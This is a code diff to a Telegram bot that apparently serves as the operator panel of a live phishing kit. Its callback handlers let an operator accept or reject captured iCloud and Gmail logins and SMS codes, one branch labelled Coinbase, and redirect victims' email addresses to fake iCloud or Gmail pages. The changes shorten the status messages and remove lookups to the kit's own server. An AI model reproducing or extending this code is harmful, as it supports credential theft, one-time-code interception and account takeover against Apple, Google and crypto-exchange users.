@@ -486,65 +486,39 @@ bot.on("callback_query", async (query) => {
       } else if (action === "reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "page_accept") {
-        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `✅ iCloud Login: Accepted!`;
       } else if (action === "page_reject") {
-        statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+        statusMessage = `❌ iCloud Login: Rejected!`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
+        // ✅ Differentiate between Coinbase SMS and iCloud SMS
+        if (identifier && identifier.includes("sms_code_")) {
+          // iCloud SMS
+          statusMessage = `✅ iCloud SMS (${smsCode}): Accepted!`;
+        } else {
+          // Coinbase SMS
+          statusMessage = `✅ SMS: ${smsCode}: Accepted!`;
+        }
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
+        // ✅ Differentiate between Coinbase SMS and iCloud SMS
+        if (identifier && identifier.includes("sms_code_")) {
+          // iCloud SMS
+          statusMessage = `❌ iCloud SMS (${smsCode}): Rejected!`;
+        } else {
+          // Coinbase SMS
+          statusMessage = `❌ SMS: ${smsCode}: Rejected!`;
+        }
       } else if (action === "redirect_icloud") {
-        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+        statusMessage = `📧 ${email} → Directed to: ☁️`;
       } else if (action === "redirect_gmail") {
-        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+        statusMessage = `📧 ${email} → Directed to: 🌈`;
       } else if (action === "gmail_accept") {
-        // ✅ For Gmail callbacks, fetch displayEmail
-        try {
-          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
-          const data = await response.json();
-          displayEmail = data.displayEmail || email;
-          console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
-        } catch (err) {
-          console.error("Error fetching Gmail display email:", err);
-          displayEmail = email;
-        }
-        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusMessage = `✅ Gmail Login: Accepted!`;
       } else if (action === "gmail_reject") {
-        // ✅ For Gmail callbacks, fetch displayEmail
-        try {
-          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
-          const data = await response.json();
-          displayEmail = data.displayEmail || email;
-          console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
-        } catch (err) {
-          console.error("Error fetching Gmail display email:", err);
-          displayEmail = email;
-        }
-        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+        statusMessage = `❌ Gmail Login: Rejected!`;
       } else if (action === "verification_accept") {
-        // ✅ For verification callbacks, fetch displayEmail
-        try {
-          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
-          const data = await response.json();
-          displayEmail = data.displayEmail || email;
-          console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
-        } catch (err) {
-          console.error("Error fetching verification display email:", err);
-          displayEmail = email;
-        }
-        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+        statusMessage = `🌈 ${email} Accepted! ✅`;
       } else if (action === "verification_reject") {
-        // ✅ For verification callbacks, fetch displayEmail
-        try {
-          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
-          const data = await response.json();
-          displayEmail = data.displayEmail || email;
-          console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
-        } catch (err) {
-          console.error("Error fetching verification display email:", err);
-          displayEmail = email;
-        }
-        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+        statusMessage = `🌈 ${email} Rejected! ❌`;
       } else if (action === "gmail_verify_accept") {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
       } else if (action === "gmail_verify_reject") {
@@ -867,69 +841,39 @@ if (bot2) {
         } else if (action === "reject") {
           statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
         } else if (action === "page_accept") {
-          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `✅ iCloud Login: Accepted!`;
         } else if (action === "page_reject") {
-          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+          statusMessage = `❌ iCloud Login: Rejected!`;
         } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
+          // ✅ Differentiate between Coinbase SMS and iCloud SMS
+          if (identifier && identifier.includes("sms_code_")) {
+            // iCloud SMS
+            statusMessage = `✅ iCloud SMS (${smsCode}): Accepted!`;
+          } else {
+            // Coinbase SMS
+            statusMessage = `✅ SMS: ${smsCode}: Accepted!`;
+          }
         } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
-        } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
-        } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
+          // ✅ Differentiate between Coinbase SMS and iCloud SMS
+          if (identifier && identifier.includes("sms_code_")) {
+            // iCloud SMS
+            statusMessage = `❌ iCloud SMS (${smsCode}): Rejected!`;
+          } else {
+            // Coinbase SMS
+            statusMessage = `❌ SMS: ${smsCode}: Rejected!`;
+          }
         } else if (action === "redirect_icloud") {
-          statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+          statusMessage = `📧 ${email} → Directed to: ☁️`;
         } else if (action === "redirect_gmail") {
-          statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+          statusMessage = `📧 ${email} → Directed to: 🌈`;
         } else if (action === "gmail_accept") {
-          // ✅ For Gmail callbacks, fetch displayEmail
-          try {
-            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
-            const data = await response.json();
-            displayEmail = data.displayEmail || email;
-            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
-          } catch (err) {
-            console.error("Error fetching Gmail display email:", err);
-            displayEmail = email;
-          }
-          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+          statusMessage = `✅ Gmail Login: Accepted!`;
         } else if (action === "gmail_reject") {
-          // ✅ For Gmail callbacks, fetch displayEmail
-          try {
-            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
-            const data = await response.json();
-            displayEmail = data.displayEmail || email;
-            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
-          } catch (err) {
-            console.error("Error fetching Gmail display email:", err);
-            displayEmail = email;
-          }
-          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+          statusMessage = `❌ Gmail Login: Rejected!`;
         } else if (action === "verification_accept") {
-          // ✅ For verification callbacks, fetch displayEmail
-          try {
-            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
-            const data = await response.json();
-            displayEmail = data.displayEmail || email;
-            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
-          } catch (err) {
-            console.error("Error fetching verification display email:", err);
-            displayEmail = email;
-          }
-          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+          statusMessage = `🌈 ${email} Accepted! ✅`;
         } else if (action === "verification_reject") {
-          // ✅ For verification callbacks, fetch displayEmail
-          try {
-            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
-            const data = await response.json();
-            displayEmail = data.displayEmail || email;
-            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
-          } catch (err) {
-            console.error("Error fetching verification display email:", err);
-            displayEmail = email;
-          }
-          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+          statusMessage = `🌈 ${email} Rejected! ❌`;
         } else if (action === "gmail_verify_accept") {
           statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
         } else if (action === "gmail_verify_reject") {
